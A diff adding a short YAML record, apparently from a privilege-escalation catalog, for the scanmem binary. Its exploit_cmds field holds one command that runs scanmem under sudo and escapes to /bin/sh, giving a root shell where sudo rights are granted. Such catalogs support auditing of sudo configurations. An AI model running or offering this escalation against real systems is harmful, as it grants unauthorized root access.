@@ -1,0 +1,4 @@
+name: scanmem
+binary_path: /usr/bin/scanmem
+exploit_cmds:
+- sudo /usr/bin/scanmem && shell /bin/sh
